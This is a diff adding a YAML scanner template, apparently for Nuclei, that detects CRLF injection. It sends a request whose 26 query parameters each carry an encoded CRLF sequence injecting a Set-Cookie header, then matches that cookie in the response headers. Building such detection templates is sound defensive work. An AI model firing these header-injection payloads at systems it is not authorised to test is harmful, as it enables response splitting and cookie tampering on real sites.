@@ -1,0 +1,19 @@
+id: crlf-alphabet
+
+info:
+  name: CRLF injection
+  author: melbadry9,nadino,xElkomy
+  severity: low
+  description: Improper sanitization of CRLF sequences.
+  tags: crlf,generic
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?a=%0D%0ASet-Cookie:crlfinjection=crlfinjection&b=%0D%0ASet-Cookie:crlfinjection=crlfinjection&c=%0D%0ASet-Cookie:crlfinjection=crlfinjection&d=%0D%0ASet-Cookie:crlfinjection=crlfinjection&e=%0D%0ASet-Cookie:crlfinjection=crlfinjection&f=%0D%0ASet-Cookie:crlfinjection=crlfinjection&g=%0D%0ASet-Cookie:crlfinjection=crlfinjection&h=%0D%0ASet-Cookie:crlfinjection=crlfinjection&i=%0D%0ASet-Cookie:crlfinjection=crlfinjection&j=%0D%0ASet-Cookie:crlfinjection=crlfinjection&k=%0D%0ASet-Cookie:crlfinjection=crlfinjection&l=%0D%0ASet-Cookie:crlfinjection=crlfinjection&m=%0D%0ASet-Cookie:crlfinjection=crlfinjection&n=%0D%0ASet-Cookie:crlfinjection=crlfinjection&o=%0D%0ASet-Cookie:crlfinjection=crlfinjection&p=%0D%0ASet-Cookie:crlfinjection=crlfinjection&q=%0D%0ASet-Cookie:crlfinjection=crlfinjection&r=%0D%0ASet-Cookie:crlfinjection=crlfinjection&s=%0D%0ASet-Cookie:crlfinjection=crlfinjection&t=%0D%0ASet-Cookie:crlfinjection=crlfinjection&u=%0D%0ASet-Cookie:crlfinjection=crlfinjection&v=%0D%0ASet-Cookie:crlfinjection=crlfinjection&w=%0D%0ASet-Cookie:crlfinjection=crlfinjection&x=%0D%0ASet-Cookie:crlfinjection=crlfinjection&y=%0D%0ASet-Cookie:crlfinjection=crlfinjection&z=%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+
+    matchers:
+      - type: regex
+        regex:
+          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
+        part: header
